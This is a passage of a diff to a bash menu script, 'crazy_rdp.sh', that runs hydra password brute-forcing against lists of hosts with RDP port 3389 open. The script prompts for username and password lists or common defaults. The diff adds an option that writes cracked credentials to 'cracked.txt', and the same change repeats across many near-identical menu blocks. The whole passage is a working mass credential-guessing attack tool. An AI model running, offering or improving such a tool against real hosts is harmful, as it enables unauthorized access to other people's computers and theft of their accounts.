 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9340,7 +9340,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9349,7 +9349,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9393,7 +9393,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9403,7 +9403,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9413,7 +9413,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9422,7 +9422,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9466,7 +9466,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9476,7 +9476,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9486,7 +9486,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9495,7 +9495,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9538,7 +9538,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9548,7 +9548,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9558,7 +9558,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9567,7 +9567,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9611,7 +9611,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9621,7 +9621,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9631,7 +9631,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9640,7 +9640,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9684,7 +9684,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9694,7 +9694,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9704,7 +9704,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9713,7 +9713,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9757,7 +9757,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9767,7 +9767,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9777,7 +9777,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9786,7 +9786,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9830,7 +9830,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9840,7 +9840,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9850,7 +9850,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9859,7 +9859,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9903,7 +9903,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9913,7 +9913,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9923,7 +9923,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9932,7 +9932,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9976,7 +9976,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9986,7 +9986,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9996,7 +9996,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10005,7 +10005,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10049,7 +10049,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10059,7 +10059,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10069,7 +10069,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10078,7 +10078,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10122,7 +10122,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10132,7 +10132,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10142,7 +10142,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10151,7 +10151,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10195,7 +10195,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10205,7 +10205,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10215,7 +10215,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10224,7 +10224,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10268,7 +10268,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10278,7 +10278,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10288,7 +10288,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10297,7 +10297,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10341,7 +10341,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10351,7 +10351,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10361,7 +10361,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10370,7 +10370,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10414,7 +10414,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10424,7 +10424,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10434,7 +10434,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10443,7 +10443,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
